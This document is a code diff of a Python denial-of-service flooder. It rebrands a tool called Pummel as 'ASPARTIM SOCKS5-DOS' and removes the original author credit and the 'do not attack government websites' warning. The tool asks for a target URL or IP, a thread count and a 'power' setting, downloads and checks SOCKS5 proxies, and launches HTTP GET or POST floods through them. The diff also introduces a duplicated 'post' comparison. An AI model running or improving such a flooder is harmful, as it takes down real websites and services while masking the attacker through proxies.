@@ -1,31 +1,29 @@
 #!/usr/bin/python3
-#Coded by HC The Chlous
 import threading
 import random
 import time
 import socket
 import sys
-import requests 
+import requests
 import socks
 import ssl
 
-print('''\r\n
-██████╗ ██╗   ██╗███╗   ███╗███╗   ███╗███████╗██╗         
-██╔══██╗██║   ██║████╗ ████║████╗ ████║██╔════╝██║         
-██████╔╝██║   ██║██╔████╔██║██╔████╔██║█████╗  ██║         
-██╔═══╝ ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██║         
-██║     ╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗███████╗    
-╚═╝      ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝   
-┌─────────────────────────────────────────────────────┐
-│ version 1.2.7                                       │
-│                                                     │
-│            [!!!HTTPS-Flood Imporved!!!]             │                      
-│                                                     │
-│                               Code By HC the Chlous │
-├─────────────────────────────────────────────────────┤
-│       Github: https://github.com/HC133/Pummel	      │
-│           [!]DO NOT ATTACK GOV WEBSITE[!]           │
-└─────────────────────────────────────────────────────┘\r\n''')
+print ('''
+      .---.        .-----------
+     /     \  __  /    ------
+    / /     \(..)/    -----
+   //////   ' \/ `   ---
+  //// / // :    : ---
+ // /   /  /`    '--
+//          //..\\
+       ====UU====UU====
+           '//||\\`
+             ''``
++--------------------------+
+|     A S P A R T I M      |
++------------------------- +
+| [+] S O C K S 5 - D O S  |
++--------------------------+''')
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
             "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -188,7 +186,7 @@ def clone():
         f.close()
     except:
         f.close()
-    print("[✓] Socks Downloaded Sucessful")
+    print("[✓] Socks5 Downloaded Sucessful !")
 
 def main():
     global ip
@@ -207,11 +205,11 @@ def main():
         print("[✓] GET Mode Selected")
     elif mode == "post" or mode == "POST":
         print("[✓] POST Mode Selected")
-    ip = str(input("URL / IP : "))
+    ip = str(input("[+] URL / IP ( example.com ) : "))
     if ip == "":
-        print("[!] Please Try Again")
+        print("[!] Please Try Again!")
         return main()
-    page = str(input("[+] Page (default=/):"))
+    page = str(input("[+] Page ( Default = / ) : "))
     if page == "":
         page = "/"
     port = str(input("[+] Port ( Default = 80 ) : "))
@@ -221,24 +219,24 @@ def main():
     else:
         port = int(port)
     if port == 443:
-        print("[✓] Port 443 Has Been Selected")        
-    th_num = str(input("Threads ( Default = 800 ) : "))
+        print("[✓] Port 443 Has Been Selected")
+    th_num = str(input("[+] Threads ( Default = 800 ) : "))
     if th_num == "":
         th_num = int(800)
     else:
         th_num = int(th_num)
     #if mode == "get" or mode == "GET":
-    N = str(input("[+] Download Socks5 List ? ( y / n ) : "))
+    N = str(input("[+] Download Socks5 List ? ( y / n Default = y ) : "))
     if N == "n" or N =="N":
         pass
     else:
         clone()
-    out_file = str(input("[+] Enter Proxy File Path ( socks5.txt ) : "))
+    out_file = str(input("[+] Enter Proxy File Path ( Default = socks5.txt ) : "))
     if out_file == "":
         out_file = "socks5.txt"
     else:
         out_file = str(out_file)
-    print ("[+] Number Of Socks5 Proxies : %s" %(len(open(out_file).readlines())))
+    print ("[✓] Number Of Socks5 Proxies : %s" %(len(open(out_file).readlines())))
     proxies = open(out_file).readlines()
     time.sleep(0.3)
     ans = str(input("[?] Check The Socks5 List ? ( y / n Default = y ) : "))
@@ -252,7 +250,7 @@ def main():
             ms = int(ms)
     check_socks()
     proxies = open(out_file).readlines()
-    multiple = str(input("Power ( Default = 100 ) : "))
+    multiple = str(input("[+] Power ( Default = 100 ) : "))
     if multiple == "":
         multiple = int(100)
     else:
@@ -304,53 +302,53 @@ def post():
 
 nums = 0
 def checking(lines,):
-	global nums
-	try:
-		proxy = lines.strip().split(":")
-		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)#credits to leeon123
-	except:
-		proxies.remove(lines)
-		return
-	err = 0
-	while True:
-		if err == 3:
-			proxies.remove(lines)
-			break
-		try:
-			s = socks.socksocket()
-			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-			s.settimeout(1)
-			s.connect((str(ip), int(port)))
-			if port==443:
-				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=ip)
-			#s.connect((str(ip), int(port)))
-			s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
-			s.close()
-			break
-		except:
-			err +=1
-	nums += 1
+        global nums
+        try:
+                proxy = lines.strip().split(":")
+                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)#credits to leeon123
+        except:
+                proxies.remove(lines)
+                return
+        err = 0
+        while True:
+                if err == 3:
+                        proxies.remove(lines)
+                        break
+                try:
+                        s = socks.socksocket()
+                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                        s.settimeout(1)
+                        s.connect((str(ip), int(port)))
+                        if port==443:
+                                ctx = ssl.SSLContext()
+                                s = ctx.wrap_socket(s,server_hostname=ip)
+                        #s.connect((str(ip), int(port)))
+                        s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
+                        s.close()
+                        break
+                except:
+                        err +=1
+        nums += 1
 
 def check_socks():
-	global nums
-	thread_list=[]
-	for lines in list(proxies):
-		th = threading.Thread(target=checking,args=(lines,))#credits to leeon123
-		th.start()
-		thread_list.append(th)
-		time.sleep(0.01)
-		sys.stdout.write("[+] Checked "+str(nums)+" Socks5\r")
-		sys.stdout.flush()
-	for th in list(thread_list):
-		th.join()
-		sys.stdout.write("[+] Checked "+str(nums)+" Socks5\r")
-		sys.stdout.flush()
-	print("\r\n[✓] Checked All Socks5 Total Worked ~~> "+str(len(proxies)))
-	with open("socks5.txt", 'wb') as fp:
-		for lines in list(proxies):
-			fp.write(bytes(lines,encoding='utf8'))
-	fp.close()
+        global nums
+        thread_list=[]
+        for lines in list(proxies):
+                th = threading.Thread(target=checking,args=(lines,))#credits to leeon123
+                th.start()
+                thread_list.append(th)
+                time.sleep(0.01)
+                sys.stdout.write("[+] Checked "+str(nums)+" Socks5\r")
+                sys.stdout.flush()
+        for th in list(thread_list):
+                th.join()
+                sys.stdout.write("[+] Checked "+str(nums)+" Socks5\r")
+                sys.stdout.flush()
+        print("\r\n[✓] Checked All Socks5 Total Worked :"+str(len(proxies)))
+        with open("socks5.txt", 'wb') as fp:
+                for lines in list(proxies):
+                        fp.write(bytes(lines,encoding='utf8'))
+        fp.close()
 
 n=0
 if __name__ == "__main__":
@@ -359,7 +357,7 @@ if mode == "get" or mode == "GET":
     for i in range(th_num):
             th = threading.Thread(target=get,daemon=True)
             th.start()
-elif mode == "post" or mode == "POST":
+elif mode == "post" or mode == "post":
     for i in range(th_num):
             th = threading.Thread(target=post,daemon=True)
             th.start()
